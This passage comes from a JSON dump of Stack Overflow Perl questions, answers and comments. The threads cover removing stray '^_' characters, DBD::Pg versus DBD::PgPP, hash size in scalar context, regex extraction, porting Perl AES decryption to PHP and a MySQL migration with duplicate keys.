"profile_image": "https://www.gravatar.com/avatar/69a1b4f750ece89db0e49c94519f1a7d?s=128&d=identicon&r=PG&f=1", "display_name": "Jens", "link": "https://stackoverflow.com/users/3636601/jens"}, "edited": false, "score": 0, "creation_date": 1455096843, "post_id": 35311247, "comment_id": 58332042, "body": "You are running under windows or linux OS?"}, {"owner": {"reputation": 554, "user_id": 241593, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/3d7e4eed5740c864a766640424643d5b?s=128&d=identicon&r=PG", "display_name": "Jaron787", "link": "https://stackoverflow.com/users/241593/jaron787"}, "edited": false, "score": 0, "creation_date": 1455096920, "post_id": 35311247, "comment_id": 58332102, "body": "This is running on Linux OS"}, {"owner": {"reputation": 60461, "user_id": 3636601, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/69a1b4f750ece89db0e49c94519f1a7d?s=128&d=identicon&r=PG&f=1", "display_name": "Jens", "link": "https://stackoverflow.com/users/3636601/jens"}, "edited": false, "score": 0, "creation_date": 1455096968, "post_id": 35311247, "comment_id": 58332138, "body": "An where you edited yor script?"}, {"owner": {"reputation": 554, "user_id": 241593, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/3d7e4eed5740c864a766640424643d5b?s=128&d=identicon&r=PG", "display_name": "Jaron787", "link": "https://stackoverflow.com/users/241593/jaron787"}, "edited": false, "score": 0, "creation_date": 1455097049, "post_id": 35311247, "comment_id": 58332185, "body": "Directly on the unix box in vi."}, {"owner": {"reputation": 3334, "user_id": 4473327, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hP14q.jpg?s=128&g=1", "display_name": "neuhaus", "link": "https://stackoverflow.com/users/4473327/neuhaus"}, "edited": false, "score": 0, "creation_date": 1455097131, "post_id": 35311247, "comment_id": 58332254, "body": "They are not trailing characters if they are in the middle of the string (&quot;_&quot; is before the last &quot;^&quot;)."}, {"owner": {"reputation": 554, "user_id": 241593, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/3d7e4eed5740c864a766640424643d5b?s=128&d=identicon&r=PG", "display_name": "Jaron787", "link": "https://stackoverflow.com/users/241593/jaron787"}, "edited": false, "score": 0, "creation_date": 1455097237, "post_id": 35311247, "comment_id": 58332322, "body": "I dont understand how &quot;^_^_&quot; has been stamped on the end of peregrinevwap"}, {"owner": {"reputation": 60461, "user_id": 3636601, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/69a1b4f750ece89db0e49c94519f1a7d?s=128&d=identicon&r=PG&f=1", "display_name": "Jens", "link": "https://stackoverflow.com/users/3636601/jens"}, "edited": false, "score": 0, "creation_date": 1455097445, "post_id": 35311247, "comment_id": 58332451, "body": "@Jaron787 Do you have copied a string from an other program? use a hex editor to see what character this are."}], "answers": [{"comments": [{"owner": {"reputation": 554, "user_id": 241593, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/3d7e4eed5740c864a766640424643d5b?s=128&d=identicon&r=PG", "display_name": "Jaron787", "link": "https://stackoverflow.com/users/241593/jaron787"}, "edited": false, "score": 0, "creation_date": 1455097952, "post_id": 35311491, "comment_id": 58332806, "body": "The problem with this is I have strings with &quot;_&quot; in them: app: ninjak_xlon"}], "tags": [], "owner": {"reputation": 3334, "user_id": 4473327, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hP14q.jpg?s=128&g=1", "display_name": "neuhaus", "link": "https://stackoverflow.com/users/4473327/neuhaus"}, "is_accepted": true, "score": 2, "last_activity_date": 1455098230, "last_edit_date": 1455098230, "creation_date": 1455097269, "answer_id": 35311491, "question_id": 35311247, "link": "https://stackoverflow.com/questions/35311247/perl-cant-remove-trailing-characters-at-the-end-of-string/35311491#35311491", "title": "Perl - can&#39;t remove trailing characters at the end of string", "body": "<p>Check out the <code>tr//cd</code> operator to get rid of unwanted characters.\nIt's documented in \"<code>perldoc perlop</code>\"</p>\n\n<pre><code>$application =~ tr/a-zA-Z//cd;\n</code></pre>\n\n<p>Will remove everything except letters from the string and </p>\n\n<pre><code>$application =~ tr/^_//d;\n</code></pre>\n\n<p>Will remove all \"^\" and \"_\" characters.</p>\n\n<p>If you only want to remove certain characters when they at the end of the string, use the s// search/replace operator with regular expressions and the <code>$</code> anchor to match the end of the string.</p>\n\n<p>Here's an example:</p>\n\n<pre><code>s/[\\^_]*$//;\n</code></pre>\n\n<p>Let's hope the underscores do not occur at the end of your strings, otherwise you can't automatically separate them from these unwanted characters.</p>\n"}, {"tags": [], "owner": {"reputation": 6130, "user_id": 299242, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f9bda794bc71267206358bf04ea0a179?s=128&d=identicon&r=PG", "display_name": "mscha", "link": "https://stackoverflow.com/users/299242/mscha"}, "is_accepted": false, "score": 0, "last_activity_date": 1455103883, "creation_date": 1455103883, "answer_id": 35314020, "question_id": 35311247, "link": "https://stackoverflow.com/questions/35311247/perl-cant-remove-trailing-characters-at-the-end-of-string/35314020#35314020", "title": "Perl - can&#39;t remove trailing characters at the end of string", "body": "<p>Are you sure these characters are actually <code>^</code> and <code>_</code> characters?\n<code>^_</code> could also indicate Ctrl-Underscore, ASCII character 0x1F (Unit Separator).  (Not a character I've ever seen used, but you never know.)</p>\n\n<p>If this is in fact the case, you can remove them with something like:</p>\n\n<pre><code>$application =~ s/\\x1F//g;\n</code></pre>\n"}], "owner": {"reputation": 554, "user_id": 241593, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/3d7e4eed5740c864a766640424643d5b?s=128&d=identicon&r=PG", "display_name": "Jaron787", "link": "https://stackoverflow.com/users/241593/jaron787"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 540, "favorite_count": 0, "accepted_answer_id": 35311491, "answer_count": 2, "score": 0, "last_activity_date": 1455103883, "creation_date": 1455096589, "last_edit_date": 1455097362, "question_id": 35311247, "link": "https://stackoverflow.com/questions/35311247/perl-cant-remove-trailing-characters-at-the-end-of-string", "title": "Perl - can&#39;t remove trailing characters at the end of string", "body": "<p>I have some trailing characters at the end of a string <code>peregrinevwap^_^_</code></p>\n\n<pre><code>print \"JH 4 - app: $application \\n\";\n\napp: peregrinevwap^_^_\n</code></pre>\n\n<p>Do you know why they are there and how I can remove them. I tried the <code>chomp</code> command but this hasn't worked.</p>\n"}, {"tags": ["perl", "postgresql", "dbd"], "comments": [{"owner": {"reputation": 3334, "user_id": 4473327, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hP14q.jpg?s=128&g=1", "display_name": "neuhaus", "link": "https://stackoverflow.com/users/4473327/neuhaus"}, "edited": false, "score": 0, "creation_date": 1455097742, "post_id": 35311228, "comment_id": 58332662, "body": "Why didn&#39;t you read the <a href=\"https://metacpan.org/pod/DBD::PgPP\" rel=\"nofollow noreferrer\">documentation</a>?"}, {"owner": {"reputation": 6201, "user_id": 1797006, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/b1a413ea490f70dc5d27f3d7eba6b4f6?s=128&d=identicon&r=PG", "display_name": "Karl Richter", "link": "https://stackoverflow.com/users/1797006/karl-richter"}, "reply_to_user": {"reputation": 3334, "user_id": 4473327, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hP14q.jpg?s=128&g=1", "display_name": "neuhaus", "link": "https://stackoverflow.com/users/4473327/neuhaus"}, "edited": false, "score": 0, "creation_date": 1455098057, "post_id": 35311228, "comment_id": 58332867, "body": "I wanted to answer the question myself... I guess I have to hit the checkbox when creating the question."}], "answers": [{"tags": [], "owner": {"reputation": 11, "user_id": 5901565, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-Dpo_wFVycPk/AAAAAAAAAAI/AAAAAAAACxg/SGbJeapKif0/photo.jpg?sz=128", "display_name": "Alexander Fomichev", "link": "https://stackoverflow.com/users/5901565/alexander-fomichev"}, "is_accepted": false, "score": 1, "last_activity_date": 1455097474, "creation_date": 1455097474, "answer_id": 35311592, "question_id": 35311228, "link": "https://stackoverflow.com/questions/35311228/whats-the-difference-between-dbdpg-and-dbdpgpp/35311592#35311592", "title": "What&#39;s the difference between DBD::Pg and DBD::PgPP", "body": "<p>According to CPAN, DBD::PgPP is a pure Perl implementation of the PostgreSQL driver. DBD:pg has some low-level c implementation.\nIf you need only Perl as a dependency, DBD::PgPP is worth looking at.</p>\n"}, {"tags": [], "owner": {"reputation": 3334, "user_id": 4473327, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hP14q.jpg?s=128&g=1", "display_name": "neuhaus", "link": "https://stackoverflow.com/users/4473327/neuhaus"}, "is_accepted": false, "score": 0, "last_activity_date": 1455097606, "creation_date": 1455097606, "answer_id": 35311650, "question_id": 35311228, "link": "https://stackoverflow.com/questions/35311228/whats-the-difference-between-dbdpg-and-dbdpgpp/35311650#35311650", "title": "What&#39;s the difference between DBD::Pg and DBD::PgPP", "body": "<p>Use DBD::Pg if it's available, it will be faster than DBD::PgPP because some parts are implemented in C, whereas DBD::PgPP is pure perl (which is what PP stands for).</p>\n"}, {"tags": [], "owner": {"reputation": 6201, "user_id": 1797006, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/b1a413ea490f70dc5d27f3d7eba6b4f6?s=128&d=identicon&r=PG", "display_name": "Karl Richter", "link": "https://stackoverflow.com/users/1797006/karl-richter"}, "is_accepted": false, "score": 0, "last_activity_date": 1455098301, "last_edit_date": 1455098301, "creation_date": 1455097930, "answer_id": 35311782, "question_id": 35311228, "link": "https://stackoverflow.com/questions/35311228/whats-the-difference-between-dbdpg-and-dbdpgpp/35311782#35311782", "title": "What&#39;s the difference between DBD::Pg and DBD::PgPP", "body": "<p>Summing up <a href=\"http://www.perlmonks.org/?node_id=457530\" rel=\"nofollow\">http://www.perlmonks.org/?node_id=457530</a>:</p>\n\n<p><em>DBD::PgPP</em> pros:</p>\n\n<ul>\n<li>easier to install than <code>DBD::Pg</code> because it doesn't depend on the external dependency </li>\n<li>more up-to-date (see below)</li>\n<li>pure <code>perl</code> implementation</li>\n</ul>\n\n<p><em>DBD::Pg</em> pros:</p>\n\n<ul>\n<li>actively maintained by the PostgreSQL team</li>\n<li>has a more friendly PostgreSQL interface</li>\n<li>offers support for <code>COPY</code> (see <a href=\"http://search.cpan.org/~turnstep/DBD-Pg-3.5.3/Pg.pm#COPY_support\" rel=\"nofollow\">http://search.cpan.org/~turnstep/DBD-Pg-3.5.3/Pg.pm#COPY_support</a> for details)</li>\n</ul>\n"}], "owner": {"reputation": 6201, "user_id": 1797006, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/b1a413ea490f70dc5d27f3d7eba6b4f6?s=128&d=identicon&r=PG", "display_name": "Karl Richter", "link": "https://stackoverflow.com/users/1797006/karl-richter"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 175, "favorite_count": 0, "answer_count": 3, "score": -2, "last_activity_date": 1455098301, "creation_date": 1455096538, "question_id": 35311228, "link": "https://stackoverflow.com/questions/35311228/whats-the-difference-between-dbdpg-and-dbdpgpp", "title": "What&#39;s the difference between DBD::Pg and DBD::PgPP", "body": "<p>What's the difference between the two PostgreSQL <code>perl</code> client implementations DBD::Pg and DBD::PgPP?</p>\n"}, {"tags": ["arrays", "perl"], "comments": [{"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1455141831, "post_id": 35310587, "comment_id": 58362407, "body": "There is no array in your code. Which variable do you think is an array?"}], "answers": [{"tags": [], "owner": {"reputation": 16507, "user_id": 4787126, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2a822df86c907c77c792a8f91b2bab41?s=128&d=identicon&r=PG&f=1", "display_name": "Zbynek Vyskovsky - kvr000", "link": "https://stackoverflow.com/users/4787126/zbynek-vyskovsky-kvr000"}, "is_accepted": false, "score": 4, "last_activity_date": 1455098185, "last_edit_date": 1455098185, "creation_date": 1455094919, "answer_id": 35310699, "question_id": 35310587, "link": "https://stackoverflow.com/questions/35310587/hash-variable-and-array-in-perl-is-giving-an-awkward-output/35310699#35310699", "title": "Hash variable and array in perl is giving an awkward output", "body": "<p>It is internal information about the hash, please check the <a href=\"http://perldoc.perl.org/perldata.html\" rel=\"nofollow\">perl documentation</a>:</p>\n\n<blockquote>\n  <p>If you evaluate a hash in scalar context, it returns false if the hash is empty. If there are any key/value pairs, it returns true; more precisely, the value returned is a string consisting of the number of used buckets and the number of allocated buckets, separated by a slash. This is pretty much useful only to find out whether Perl's internal hashing algorithm is performing poorly on your data set.</p>\n</blockquote>\n\n<p>So here specifically it means that you have 8 buckets allocated in the hash and three of them are used.</p>\n\n<p>To get the size use:</p>\n\n<pre><code>$size = keys %hash; # scalar is implicit here\nprint(scalar keys %hash);\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 5923, "user_id": 2105156, "user_type": "registered", "accept_rate": 76, "profile_image": "https://i.stack.imgur.com/oRMc0.jpg?s=128&g=1", "display_name": "fugu", "link": "https://stackoverflow.com/users/2105156/fugu"}, "is_accepted": false, "score": 2, "last_activity_date": 1455094949, "creation_date": 1455094949, "answer_id": 35310709, "question_id": 35310587, "link": "https://stackoverflow.com/questions/35310587/hash-variable-and-array-in-perl-is-giving-an-awkward-output/35310709#35310709", "title": "Hash variable and array in perl is giving an awkward output", "body": "<p>If you want to find out the number of keys/values by using <code>scalar</code> <code>keys</code>:</p>\n\n<pre><code>my %name= ( \"xyz\",1 ,\"is\",2, \"my\",3,\"name\",4);\n\nmy %copy = %name;\n\nmy $size = scalar keys %name;\n\nprint \"your rank is : $copy{'xyz'}\\n\";\nprint \"the size of the array is : $size\\n\";\n</code></pre>\n"}], "owner": {"reputation": 21, "user_id": 5907288, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6d47d25adc9150c97f040dbc159a13c9?s=128&d=identicon&r=PG&f=1", "display_name": "zigma", "link": "https://stackoverflow.com/users/5907288/zigma"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 44, "favorite_count": 0, "answer_count": 2, "score": 2, "last_activity_date": 1455098311, "creation_date": 1455094555, "last_edit_date": 1455098311, "question_id": 35310587, "link": "https://stackoverflow.com/questions/35310587/hash-variable-and-array-in-perl-is-giving-an-awkward-output", "title": "Hash variable and array in perl is giving an awkward output", "body": "<p>I have just started with Perl scripting, while making an array and and fetching it from the hash variable. I am getting an awkward output.</p>\n\n<p>Code is here:</p>\n\n<pre><code>%name= ( \"xyz\",1 ,\"is\",2, \"my\",3,\"name\",4);\n%copy=%name;\n$size=%name;\nprint \" your rank is : $copy{'xyz'}\";\nprint \" \\n\";\nprint \" the size of the array is : $size\";\n</code></pre>\n\n<p>output is coming as :</p>\n\n<pre><code>your rank is : 1 \n the size of the array is : 3/8\n</code></pre>\n\n<p>why is the size of the array is of 3/8?</p>\n"}, {"tags": ["perl"], "answers": [{"tags": [], "owner": {"reputation": 9406, "user_id": 4923629, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/2abZO.png?s=128&g=1", "display_name": "123", "link": "https://stackoverflow.com/users/4923629/123"}, "is_accepted": true, "score": 3, "last_activity_date": 1455094656, "creation_date": 1455094656, "answer_id": 35310622, "question_id": 35310369, "link": "https://stackoverflow.com/questions/35310369/how-to-regex-one-word-from-escaped-and-closed-parenthesis/35310622#35310622", "title": "How to regex one word from escaped and closed parenthesis?", "body": "<p>This will work    </p>\n\n<pre><code>use strict;\nuse warnings;\n\nmy $ln = qq{CN=xuser\\\\,user(loginuser),OU=Site-Omg,OU=Accounts_User,OU};\n\nprint $1 . \"\\n\" if $ln =~ /\\(([^)]*)/\n</code></pre>\n\n<p>Things to note</p>\n\n<p>I have used strict and warnings to show any errors in the script( would have been very useful for your original)<br>\nI have used <code>qq{...}</code> to quote the original string<br>\nI have ended the line with <code>;</code><br>\nI have performed the regex match on $ln instead of <code>$_</code> using <code>$ln =~ ...</code><br>\nI have written correct regex to get the match.  </p>\n"}], "owner": {"reputation": 5073, "user_id": 387631, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/8c18f83e9332320fffa83e37e5a9bf31?s=128&d=identicon&r=PG", "display_name": "bsd", "link": "https://stackoverflow.com/users/387631/bsd"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 20, "favorite_count": 0, "accepted_answer_id": 35310622, "answer_count": 1, "score": 0, "last_activity_date": 1455094656, "creation_date": 1455093905, "question_id": 35310369, "link": "https://stackoverflow.com/questions/35310369/how-to-regex-one-word-from-escaped-and-closed-parenthesis", "title": "How to regex one word from escaped and closed parenthesis?", "body": "<p>I am trying to get \"loginuser\" value from this line. Please  suggest</p>\n\n<pre><code>my $ln = CN=xuser\\\\,user(loginuser),OU=Site-Omg,OU=Accounts_User,OU\n\n    if (/ln: (\\S.*\\S)\\s*$/)\n       { print $1; }\n</code></pre>\n"}, {"tags": ["php", "algorithm", "perl", "encryption", "cryptography"], "comments": [{"owner": {"reputation": 52633, "user_id": 3155639, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/d254eedd932f950213109aa3706aba74?s=128&d=identicon&r=PG", "display_name": "Alexander O&#39;Mara", "link": "https://stackoverflow.com/users/3155639/alexander-omara"}, "edited": false, "score": 0, "creation_date": 1455093128, "post_id": 35310059, "comment_id": 58329722, "body": "Evidently it&#39;s AES encrypted using whatever key <code>$k</code> is, and base64-encoded for plain-text transmission."}, {"owner": {"reputation": 11, "user_id": 4734004, "user_type": "registered", "profile_image": "https://graph.facebook.com/10202429176289192/picture?type=large", "display_name": "darrylp", "link": "https://stackoverflow.com/users/4734004/darrylp"}, "reply_to_user": {"reputation": 52633, "user_id": 3155639, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/d254eedd932f950213109aa3706aba74?s=128&d=identicon&r=PG", "display_name": "Alexander O&#39;Mara", "link": "https://stackoverflow.com/users/3155639/alexander-omara"}, "edited": false, "score": 0, "creation_date": 1455093214, "post_id": 35310059, "comment_id": 58329771, "body": "I understand that.. But what PHP functions can I use to decrypt it? mcrypt doesnt seem to work"}, {"owner": {"reputation": 52633, "user_id": 3155639, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/d254eedd932f950213109aa3706aba74?s=128&d=identicon&r=PG", "display_name": "Alexander O&#39;Mara", "link": "https://stackoverflow.com/users/3155639/alexander-omara"}, "edited": false, "score": 0, "creation_date": 1455093259, "post_id": 35310059, "comment_id": 58329806, "body": "I think <a href=\"https://secure.php.net/manual/en/function.openssl-decrypt.php\" rel=\"nofollow noreferrer\"><code>openssl_decrypt</code></a> can, if you pass the right <code>$method</code> and <code>$password</code>, but I&#39;m not 100% sure. The comments on this page might be worth a read: <a href=\"https://secure.php.net/manual/en/function.openssl-encrypt.php\" rel=\"nofollow noreferrer\">secure.php.net/manual/en/function.openssl-encrypt.php</a>"}], "answers": [{"tags": [], "owner": {"reputation": 3334, "user_id": 4473327, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hP14q.jpg?s=128&g=1", "display_name": "neuhaus", "link": "https://stackoverflow.com/users/4473327/neuhaus"}, "is_accepted": false, "score": 0, "last_activity_date": 1455097969, "creation_date": 1455097969, "answer_id": 35311801, "question_id": 35310059, "link": "https://stackoverflow.com/questions/35310059/perl-encryption-to-php-encryption-conversion/35311801#35311801", "title": "Perl Encryption to PHP Encryption conversion", "body": "<p>The perl code looks self-explanatory to me.</p>\n\n<p>Check out PHP's <code>openssl_decrypt</code> documented at <a href=\"http://thefsb.tumblr.com/post/110749271235/using-opensslendecrypt-in-php-instead-of\" rel=\"nofollow\">http://thefsb.tumblr.com/post/110749271235/using-opensslendecrypt-in-php-instead-of</a></p>\n"}], "owner": {"reputation": 11, "user_id": 4734004, "user_type": "registered", "profile_image": "https://graph.facebook.com/10202429176289192/picture?type=large", "display_name": "darrylp", "link": "https://stackoverflow.com/users/4734004/darrylp"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 103, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1455097969, "creation_date": 1455092786, "question_id": 35310059, "link": "https://stackoverflow.com/questions/35310059/perl-encryption-to-php-encryption-conversion", "title": "Perl Encryption to PHP Encryption conversion", "body": "<p>Im in the middle of converting a very uncommented / cryptic perl \"webpage\" to PHP, and I am stuck in the middle of trying to decrypt strings..</p>\n\n<p>Here is a sample of the encrypted string</p>\n\n<p>U2FsdGVkX1+EV7P6FpjSronQjGKl5nRd9CCBe2Z7a23t+MvdM1jg5VDgK73qIHJr</p>\n\n<p>Here are the perl functions used to encrypt it</p>\n\n<pre><code>use Crypt::OpenSSL::AES;\nuse Crypt::CBC;\nuse MIME::Base64;\n\n\n#---------------------------------------------------------------------------\nsub InitAES\n#---------------------------------------------------------------------------\n{\n my ($k) = @_;\n\nreturn (Crypt::CBC-&gt;new(\n-key    =&gt; $k,\n-cipher =&gt; \"Crypt::OpenSSL::AES\"\n));\n}\n\n#---------------------------------------------------------------------------\n sub EnCryptAES\n#---------------------------------------------------------------------------\n   {\n my ($d, $k) = @_;\nif (!defined($d)) { return(0); }\nif (!defined($k)) { return(0); }\n\n $cipher = &amp;InitAES($k);\n\nreturn (encode_base64($cipher-&gt;encrypt($d)));\n}\n\n#---------------------------------------------------------------------------\nsub DeCryptAES\n#---------------------------------------------------------------------------\n{\n my ($e, $k) = @_;\n if (!defined($e)) { return(0); }\n if (!defined($k)) { return(0); }\n\n $cipher = &amp;InitAES($k);\n return ($cipher-&gt;decrypt(decode_base64($e)));\n}\n</code></pre>\n\n<p>If anyone can help me write a php function to decrypt this, it would greatly be appreciated, I have tried a few different functions I have found by searching and none seem to be working. I do have the password for the task as well.</p>\n"}, {"tags": ["mysql", "perl"], "comments": [{"owner": {"reputation": 36469, "user_id": 5353753, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/8658d889ba478c305810bd346e21da33?s=128&d=identicon&r=PG&f=1", "display_name": "sagi", "link": "https://stackoverflow.com/users/5353753/sagi"}, "edited": false, "score": 0, "creation_date": 1455090690, "post_id": 35309504, "comment_id": 58328526, "body": "Where is your script?"}, {"owner": {"reputation": 379, "user_id": 1474701, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/679120adfc2610cffd50fe686b361651?s=128&d=identicon&r=PG", "display_name": "ashu", "link": "https://stackoverflow.com/users/1474701/ashu"}, "reply_to_user": {"reputation": 36469, "user_id": 5353753, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/8658d889ba478c305810bd346e21da33?s=128&d=identicon&r=PG&f=1", "display_name": "sagi", "link": "https://stackoverflow.com/users/5353753/sagi"}, "edited": false, "score": 0, "creation_date": 1455091714, "post_id": 35309504, "comment_id": 58329044, "body": "Please check update question with script and schema"}, {"owner": {"reputation": 36469, "user_id": 5353753, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/8658d889ba478c305810bd346e21da33?s=128&d=identicon&r=PG&f=1", "display_name": "sagi", "link": "https://stackoverflow.com/users/5353753/sagi"}, "edited": false, "score": 0, "creation_date": 1455091834, "post_id": 35309504, "comment_id": 58329099, "body": "Does both table have the same structure?"}, {"owner": {"reputation": 379, "user_id": 1474701, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/679120adfc2610cffd50fe686b361651?s=128&d=identicon&r=PG", "display_name": "ashu", "link": "https://stackoverflow.com/users/1474701/ashu"}, "reply_to_user": {"reputation": 36469, "user_id": 5353753, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/8658d889ba478c305810bd346e21da33?s=128&d=identicon&r=PG&f=1", "display_name": "sagi", "link": "https://stackoverflow.com/users/5353753/sagi"}, "edited": false, "score": 0, "creation_date": 1455091972, "post_id": 35309504, "comment_id": 58329165, "body": "Yes same structure, except &#39;U_LIST&#39; is extra column in db2."}, {"owner": {"reputation": 346, "user_id": 5260590, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0d2f89fc5f04467d08d7fb5238d11ee3?s=128&d=identicon&r=PG&f=1", "display_name": "Pionas", "link": "https://stackoverflow.com/users/5260590/pionas"}, "edited": false, "score": 0, "creation_date": 1455091993, "post_id": 35309504, "comment_id": 58329179, "body": "Try <a href=\"http://dev.mysql.com/doc/refman/5.7/en/insert-on-duplicate.html\" rel=\"nofollow noreferrer\">on duplicate key ignore</a> or <a href=\"http://stackoverflow.com/a/4596409/5260590\">check this</a>"}, {"owner": {"reputation": 379, "user_id": 1474701, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/679120adfc2610cffd50fe686b361651?s=128&d=identicon&r=PG", "display_name": "ashu", "link": "https://stackoverflow.com/users/1474701/ashu"}, "reply_to_user": {"reputation": 346, "user_id": 5260590, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0d2f89fc5f04467d08d7fb5238d11ee3?s=128&d=identicon&r=PG&f=1", "display_name": "Pionas", "link": "https://stackoverflow.com/users/5260590/pionas"}, "edited": false, "score": 0, "creation_date": 1455092749, "post_id": 35309504, "comment_id": 58329534, "body": "@Pionas If i ignore the duplicate key, then it will not insert. i want all data to be migrated from db1 to db2 ignoring that duplicate key error."}, {"owner": {"reputation": 346, "user_id": 5260590, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0d2f89fc5f04467d08d7fb5238d11ee3?s=128&d=identicon&r=PG&f=1", "display_name": "Pionas", "link": "https://stackoverflow.com/users/5260590/pionas"}, "edited": false, "score": 0, "creation_date": 1455092925, "post_id": 35309504, "comment_id": 58329624, "body": "You try <code>INSERT IGNORE</code>? Maybe remove the primary key and add it to the end?"}], "answers": [{"comments": [{"owner": {"reputation": 379, "user_id": 1474701, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/679120adfc2610cffd50fe686b361651?s=128&d=identicon&r=PG", "display_name": "ashu", "link": "https://stackoverflow.com/users/1474701/ashu"}, "edited": false, "score": 0, "creation_date": 1455100765, "post_id": 35312017, "comment_id": 58334701, "body": "sorry, its typo mistake PRIMARY KEY (<code>CONN_ID</code>,<code>PWORD</code>) is right for both db"}, {"owner": {"reputation": 379, "user_id": 1474701, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/679120adfc2610cffd50fe686b361651?s=128&d=identicon&r=PG", "display_name": "ashu", "link": "https://stackoverflow.com/users/1474701/ashu"}, "edited": false, "score": 0, "creation_date": 1455101022, "post_id": 35312017, "comment_id": 58334860, "body": "no, if do insert ignore, it just doesnt throw error, no data is inserted"}, {"owner": {"reputation": 3334, "user_id": 4473327, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hP14q.jpg?s=128&g=1", "display_name": "neuhaus", "link": "https://stackoverflow.com/users/4473327/neuhaus"}, "reply_to_user": {"reputation": 379, "user_id": 1474701, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/679120adfc2610cffd50fe686b361651?s=128&d=identicon&r=PG", "display_name": "ashu", "link": "https://stackoverflow.com/users/1474701/ashu"}, "edited": false, "score": 0, "creation_date": 1455101254, "post_id": 35312017, "comment_id": 58335008, "body": "Just print every row before you insert it then you will see which row(s) is causing the problems."}, {"owner": {"reputation": 379, "user_id": 1474701, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/679120adfc2610cffd50fe686b361651?s=128&d=identicon&r=PG", "display_name": "ashu", "link": "https://stackoverflow.com/users/1474701/ashu"}, "edited": false, "score": 0, "creation_date": 1455101333, "post_id": 35312017, "comment_id": 58335063, "body": "See the PWORD and CONN_ID in db1 :                                                              <code>PWORD </code> varchar(255) COLLATE utf8_bin NOT NULL.....                                                                  in db2 its schema is:                                                                                                      <code>PWORD </code> varchar(255) NOT NULL,                                                                   does this cause issue?"}, {"owner": {"reputation": 3334, "user_id": 4473327, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hP14q.jpg?s=128&g=1", "display_name": "neuhaus", "link": "https://stackoverflow.com/users/4473327/neuhaus"}, "reply_to_user": {"reputation": 379, "user_id": 1474701, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/679120adfc2610cffd50fe686b361651?s=128&d=identicon&r=PG", "display_name": "ashu", "link": "https://stackoverflow.com/users/1474701/ashu"}, "edited": false, "score": 0, "creation_date": 1455101486, "post_id": 35312017, "comment_id": 58335172, "body": "insert a line in the while loop before <code>$insert-&gt;execute</code>: <code>print &quot;&#39;$PWORD&#39;\\t&#39;$CONN_ID&#39;\\n&quot;;</code>"}, {"owner": {"reputation": 3334, "user_id": 4473327, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hP14q.jpg?s=128&g=1", "display_name": "neuhaus", "link": "https://stackoverflow.com/users/4473327/neuhaus"}, "reply_to_user": {"reputation": 379, "user_id": 1474701, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/679120adfc2610cffd50fe686b361651?s=128&d=identicon&r=PG", "display_name": "ashu", "link": "https://stackoverflow.com/users/1474701/ashu"}, "edited": false, "score": 0, "creation_date": 1455101539, "post_id": 35312017, 